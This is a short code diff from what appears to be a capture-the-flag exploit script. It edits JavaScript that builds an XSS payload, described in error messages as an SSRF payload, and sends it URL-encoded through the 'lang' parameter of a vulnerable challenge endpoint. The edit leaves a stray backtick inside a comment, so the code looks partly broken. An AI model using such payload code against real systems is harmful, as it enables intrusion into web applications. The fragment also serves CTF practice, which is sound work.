@@ -33,12 +33,8 @@
 
                     // Debug: Log confirmation after form submission
                     console.log("[Debug] Form submitted successfully.");
-                } catch (err) {
-                    console.error("[Error] Failed to execute SSRF payload:", err);
-                    alert("[Error] Failed to execute SSRF payload. Check console for details.");
-                } // Closing try-catch block
-            `; // Properly closing the template literal
-
+                } // `;
+            
             // Construct the URL for the vulnerable endpoint with the properly encoded XSS payload
             const targetUrl = 'http://chal2.lagncra.sh:8426/?lang=' + encodeURIComponent(xssPayload);
 
